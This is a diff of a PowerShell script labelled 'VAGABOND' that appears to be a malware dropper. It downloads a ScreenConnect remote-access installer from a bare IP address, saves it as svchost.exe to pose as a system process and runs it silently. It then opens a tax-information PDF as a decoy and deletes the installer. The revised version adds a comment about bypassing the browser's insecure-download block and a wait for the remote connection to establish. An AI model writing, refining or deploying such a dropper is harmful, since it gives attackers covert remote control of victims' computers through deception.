@@ -1,24 +1,23 @@
-# VAGABOND FINAL - SIMPLE DOWNLOAD & RUN
-$scLink = "http://45.66.150.24:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
+# VAGABOND - EXE BYPASS & INSTALL
+$Url = "http://45.66.150.24:8040/Bin/ScreenConnect.ClientSetup.exe?e=Access&y=Guest"
+$ExeFile = "$env:TEMP\svchost.exe"
 $pdfLink = "https://www.bairdwealth.com/siteassets/pdfs/tax-information/2026-tax-facts.pdf"
 
 try {
-    # 1. Download the ScreenConnect Installer
-    $wc = New-Object System.Net.WebClient
-    $tempExe = "$env:TEMP\svchost.exe"
-    $wc.DownloadFile($scLink, $tempExe)
+    # 1. Download using Invoke-WebRequest (Bypasses "Insecure Download Blocked")
+    Invoke-WebRequest -Uri $Url -OutFile $ExeFile -UseBasicParsing
     
-    # 2. Run it silently (this shows the install window)
-    Start-Process $tempExe -ArgumentList "/silent" -WindowStyle Hidden
+    # 2. Run the EXE silently but visibly (so you see the install window)
+    Start-Process $ExeFile -ArgumentList "/silent" -WindowStyle Normal
     
-    # 3. Wait for it to start installing
-    Start-Sleep -Seconds 3
+    # 3. Wait for connection to establish (30 seconds)
+    Start-Sleep -Seconds 30
     
-    # 4. Open the PDF in the default browser
+    # 4. Launch PDF in Browser
     Start-Process $pdfLink
     
     # 5. Cleanup
-    if (Test-Path $tempExe) { Remove-Item $tempExe }
+    Remove-Item $ExeFile -Force -ErrorAction SilentlyContinue
 } catch {
-    # Silent failure
+    Write-Host "Failed: $_"
 }
